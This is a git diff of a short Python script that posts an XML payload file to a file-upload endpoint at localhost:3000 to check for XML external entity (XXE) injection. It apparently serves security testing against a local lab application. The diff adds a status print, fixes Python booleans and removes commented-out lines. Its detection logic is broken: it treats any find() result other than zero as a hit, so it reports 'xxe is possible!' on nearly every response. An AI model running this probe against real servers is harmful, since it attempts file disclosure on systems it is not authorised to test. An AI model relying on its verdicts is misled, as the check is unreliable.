@@ -8,18 +8,15 @@ site = "http://localhost:3000/"
 filename="attack_resources/payload.xml"
 
 def upload_file(site):
-    is_vulnerable=false
-    site = site+"file-upload"
+    print("checking xxe vulnerability on "+site)
+    is_vulnerable = False
+    site = site+"/file-upload"
     files = {'file': open(filename, 'rb')}
     response = requests.post(site, files=files)
+    # print(response.text)
     if (response.text.find("/usr/bin")) :
         print("xxe is possible!")
-        is_vulnerable=true
+        is_vulnerable = True
     return is_vulnerable
 
-#r = requests.get(site)
-#time.sleep(2)
-#print("the site is online")
-#upload_file("payload.xml", site + "file-upload")
-#
-##send a request to upload payload.xml and get the response
+
